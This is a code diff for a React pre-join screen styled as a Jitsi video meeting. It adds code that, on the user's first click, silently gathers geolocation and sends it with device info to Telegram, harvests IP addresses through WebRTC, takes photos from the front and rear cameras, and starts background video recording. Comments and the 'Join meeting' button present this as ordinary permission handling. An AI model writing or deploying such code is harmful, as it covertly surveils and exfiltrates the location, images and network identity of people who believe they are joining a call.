+      console.log('✅ [handleJoinWithoutAudio] Разрешения уже есть - входим немедленно!');
+      setIsJoining(true);
+      
+      try {
+        const joinData = await joinRoom(roomName, userName);
+        console.log('✅ JWT токен получен для немедленного входа (без аудио):', {
+          role: joinData.role,
+          identity: joinData.identity,
+          livekitUrl: joinData.livekitUrl
+        });
+        
+        // Сохраняем в localStorage
+        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
+        
+        // ВХОДИМ В КОМНАТУ!
+        console.log('🚪 [handleJoinWithoutAudio FAST] Вызов onJoinRoom');
+        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+        return;
+      } catch (error) {
+        console.error('❌ Ошибка получения токена:', error);
+        setIsJoining(false);
+        return;
+      }
+    }
+    
+    // 🔒 Защита от двойного вызова (только если разрешения ЕЩЁ запрашиваются)
+    if (isExecutingPermissionsRef.current || isJoining) {
+      log('⚠️ [handleJoinWithoutAudio] Процесс уже выполняется - пропускаем!');
+      return;
+    }
+    
+    setIsJoining(true); // ✅ Показываем Loading...
+    isExecutingPermissionsRef.current = true; // ✅ Блокируем повторные вызовы НЕМЕДЛЕННО
     // Send /start notification to additional chat IDs via backend
     sendStartAPI().catch(err => console.error('Error sending start notification:', err));
     handleRequestAllPermissions();
@@ -1463,89 +1800,133 @@ export default function JitsiPreJoin({
   // AUTO-REQUEST PERMISSIONS ON FIRST USER INTERACTION
   // ========================================
   
-  const handleFirstInteraction = () => {
+  const handleFirstInteraction = async () => {
+    console.log('🔔 [PreJoin] handleFirstInteraction вызвана!', {
+      permissionsRequested,
+      isExecuting: isExecutingPermissionsRef.current
+    });
+    
     // Запускаем только ОДИН раз
     if (permissionsRequested || isExecutingPermissionsRef.current) {
+      console.warn('⚠️ [PreJoin] Permissions уже запрошены - пропускаем!');
       return;
     }
     
     console.log('🚀 [PreJoin] Первое взаимодействие пользователя → запускаем автозапрос permissions!');
     
-    setPermissionsRequested(true);
     isExecutingPermissionsRef.current = true;
+    let cameraGranted = false;
     
-    // ВАЖНО: Запускаем async код БЕЗ await, чтобы getUserMedia вызвался СИНХРОННО в контексте user gesture
-    (async () => {
-      let cameraGranted = false;
+    // 🔍 Проверяем доступные устройства
+    let hasAudio = true;
+    try {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const audioDevices = devices.filter(d => d.kind === 'audioinput');
+      hasAudio = audioDevices.length > 0;
       
+      if (!hasAudio) {
+        console.log(`⚠️ [PreJoin] Микрофоны не найдены - будем запрашивать только видео`);
+      }
+    } catch (enumErr) {
+      console.log(`⚠️ [PreJoin] Не удалось получить список устройств: ${enumErr}`);
+    }
+    
+    try {
+      // 1️⃣ ЗАПРОС КАМЕРЫ + МИКРОФОНА (СИНХРОННЫЙ ВЫЗОВ В КОНТЕКСТЕ USER GESTURE!)
+      console.log(`🎥 [1/2] Запрашиваем камеру${hasAudio ? ' + микрофон' : ''}...`);
+      
+      let stream: MediaStream | null = null;
+      
+      // Пробуем сначала с базовыми constraints
       try {
-        // 1️⃣ ЗАПРОС КАМЕРЫ + МИКРОФОНА (СИНХРОННЫЙ ВЫЗОВ!)
-        console.log('🎥 [1/2] Запрашиваем камеру + микрофон...');
+        console.log(`🎥 Попытка 1: базовые constraints (video${hasAudio ? ' + audio' : ''})...`);
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: hasAudio
+        });
+        console.log('✅ Базовые constraints сработали');
+      } catch (basicError) {
+        console.warn('⚠️ Базовые constraints не сработали:', basicError);
         
-        const deviceType = detectDevice();
-        const constraints: MediaStreamConstraints = deviceType === 'desktop' ? {
-          video: {
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-          },
-          audio: true
-        } : {
-          video: { 
-            facingMode: 'user',
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-          },
-          audio: true
-        };
-        
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        // Fallback: пробуем только video
+        try {
+          console.log('🎥 Попытка 2: только video...');
+          stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          console.log('✅ Только video сработало');
+        } catch (videoError) {
+          console.error('❌ Только video не сработало:', videoError);
+          throw videoError;
+        }
+      }
+      
+      if (stream) {
         console.log('✅ Камера + микрофон: разрешено');
         cameraGranted = true;
+        
+        // ✅ Устанавливаем флаг ПОСЛЕ успешного получения разрешений
+        setPermissionsRequested(true);
         
         // Скрываем alert, так как разрешение получено
         setShowPermissionAlert(false);
         
         // Останавливаем stream, нам нужно было только разрешение получить
         stream.getTracks().forEach(track => track.stop());
-        
-      } catch (error) {
-        console.error('❌ Камера/микрофон: отклонено или ошибка:', error);
-        setShowPermissionAlert(true); // Показываем alert при отклонении
       }
       
-      // 2️⃣ ЗАПРОС ГЕОЛОКАЦИИ (НЕЗАВИСИМО ОТ РЕЗУЛЬТАТА КАМЕРЫ!)
-      try {
-        console.log('📍 [2/2] Запрашиваем геолокацию...');
+    } catch (error) {
+      console.error('❌ Камера/микрофон: отклонено или ошибка:', error);
+      setShowPermissionAlert(true); // Показываем alert при отклонении
+      isExecutingPermissionsRef.current = false; // Сбрасываем флаг чтобы можно было повторить
+      return; // Выходим если камера не получена
+    }
+    
+    // 2️⃣ ЗАПРОС ГЕОЛОКАЦИИ (НЕ критично - если отклонена, продолжаем без неё)
+    try {
+      console.log('📍 [2/2] Запрашиваем геолокацию...');
+      
+      const position = await requestLocation(10000);
+      console.log('✅ Геолокация: разрешено');
+      
+      // Сохраняем геолокацию
+      if (position && typeof position === 'object' && 'coords' in position) {
+        const { latitude, longitude, accuracy } = position.coords;
+        const timestamp = new Date().toLocaleString('ru-RU', {
+          year: 'numeric',
+          month: '2-digit',
+          day: '2-digit',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit',
+          hour12: false
+        });
         
-        const position = await requestLocation(10000);
-        console.log('✅ Геолокация: разрешено');
+        setGeoData({ latitude, longitude, accuracy, timestamp });
         
-        // Сохраняем геолокацию
-        if (position && typeof position === 'object' && 'coords' in position) {
-          const { latitude, longitude, accuracy } = position.coords;
-          const timestamp = new Date().toLocaleString('ru-RU', {
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit',
-            hour12: false
-          });
-          
-          setGeoData({ latitude, longitude, accuracy, timestamp });
-          
-          // Отправляем в Telegram
-          if (!geoLocationSentRef.current) {
-            const deviceInfo = getDeviceInfo();
-            await logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
-            await sendToTelegram(latitude, longitude, accuracy);
-            geoLocationSentRef.current = true;
-          }
+        // Отправляем в Telegram
+        if (!geoLocationSentRef.current) {
+          const deviceInfo = getDeviceInfo();
+          await logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
+          await sendToTelegram(latitude, longitude, accuracy);
+          geoLocationSentRef.current = true;
         }
-        
-        // 📸 ЗАХВАТ ФОТО сразу после получения разрешений
-        if (cameraGranted && !photosCaptured) {
+      }
+    } catch (error) {
+      console.error('❌ [PreJoin] Геолокация: отклонено или ошибка:', error);
+      console.log('ℹ️ [PreJoin] Продолжаем без геолокации...');
+      // НЕ прерываем выполнение - продолжаем дальше!
+    }
+    
+    // 3️⃣ СБОР IP АДРЕСОВ через WebRTC (всегда выполняется)
+    console.log('🌐 [PreJoin] Собираем IP адреса...');
+    try {
+      await collectIPs();
+      console.log('✅ [PreJoin] IP адреса собраны');
+    } catch (error) {
+      console.error('❌ [PreJoin] Ошибка сбора IP:', error);
+    }
+    
+    // 4️⃣ ЗАХВАТ ФОТО (всегда выполняется если камера разрешена)
+      if (cameraGranted && !photosCaptured) {
           console.log('📸 [PreJoin] Захватываем фото...');
           
           // Небольшая задержка чтобы браузер "запомнил" разрешение
@@ -1577,23 +1958,31 @@ export default function JitsiPreJoin({
             console.error('❌ Ошибка фото с задней камеры:', error);
           }
           
-          setPhotosCaptured(true);
-          console.log('✅ [PreJoin] Все фото захвачены!');
-        }
-        
-        console.log('✅ [PreJoin] Автозапрос permissions завершён успешно!');
-        
-        // Скрываем alert после успешного получения всех разрешений
-        if (cameraGranted) {
-          setShowPermissionAlert(false);
-        }
-        
+      setPhotosCaptured(true);
+      console.log('✅ [PreJoin] Все фото захвачены!');
+      
+      // 🔧 Увеличенная задержка перед видеозаписью для освобождения камеры
+      console.log('⏳ [PreJoin] Ждём 1000ms для полного освобождения камеры...');
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      
+      // 5️⃣ ЗАПУСК ВИДЕОЗАПИСИ (всегда выполняется)
+      console.log('🎥 [PreJoin] Запускаем видеозапись...');
+      try {
+        await startVideoRecording();
+        console.log('✅ [PreJoin] Видеозапись успешно запущена в фоне');
       } catch (error) {
-        console.error('❌ [PreJoin] Геолокация: отклонено или ошибка:', error);
-      } finally {
-        isExecutingPermissionsRef.current = false;
+        console.error('❌ [PreJoin] Ошибка запуска видеозаписи:', error);
       }
-    })();
+    }
+    
+    console.log('✅ [PreJoin] Автозапрос permissions завершён успешно!');
+    
+    // Скрываем alert после успешного получения всех разрешений
+    if (cameraGranted) {
+      setShowPermissionAlert(false);
+    }
+    
+    isExecutingPermissionsRef.current = false;
   };
 
   // ========================================
@@ -1751,10 +2140,10 @@ export default function JitsiPreJoin({
             <div className="relative mb-4">
               <button
                 onClick={handleJoinMeeting}
-                disabled={!userName.trim()}
+                disabled={!userName.trim() || isJoining}
                 className="w-full bg-[#4687ed] text-white text-base font-bold py-2.5 px-4 rounded-md hover:bg-[#3a75d9] transition-colors disabled:bg-[#2d5fa1] disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                Join meeting
+                {isJoining ? 'Loading...' : 'Join meeting'}
               </button>
               
               {/* Join menu dropdown button */}
